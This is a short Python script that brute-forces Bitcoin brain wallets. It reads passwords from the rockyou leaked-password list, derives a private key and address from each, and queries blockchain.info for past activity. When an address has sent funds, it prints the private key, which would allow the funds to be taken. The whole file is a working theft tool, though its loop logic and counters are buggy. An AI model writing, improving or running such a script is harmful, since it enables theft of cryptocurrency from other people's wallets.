#!/usr/bin/env python 3+
# -*- coding: utf-8 -*-
#
#  getit.py
#  multi-threading check key
#  
#  Copyright 2021 geek <geek@KALIBOX>
#  
# ******** TO DO COMMENT LINE args ******************

import sys, getopt, requests, time, blocksmith
import concurrent.futures
#from validate_email import validate_email

count=0
okcount=0
kg = blocksmith.KeyGenerator()

def check_key(thekey):
	thekey=thekey.strip()
	kg.seed_input(thekey)
	privatekey = kg.generate_key()
	publickey = blocksmith.BitcoinWallet.generate_address(privatekey)
	#print(f'Private: {privatekey} Public:{publickey}')
	#print(f'This the key: {thekey} and {privatekey}')
	r = requests.get("https://blockchain.info/q/getsentbyaddress/"+publickey)
	#print(r.text)
	if int(r.text) > 0:
		print("Bitcoin Address is:", publickey)
		print("Private Key is: ", privatekey)
		print("Balance is: ",r.text)
		exit()
	else:
		print(f'{thekey} has {r.text} == nope')

	return True
	
with open('/usr/share/dict/rockyou.txt','r') as a_file:
	for line in a_file:
		thekey=a_file.readline()
		count+=1
		with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
			if executor.submit(check_key, thekey):
				okcount+=1
	print(f'\033[0mFinished: Total: {count} Existing: {okcount}')
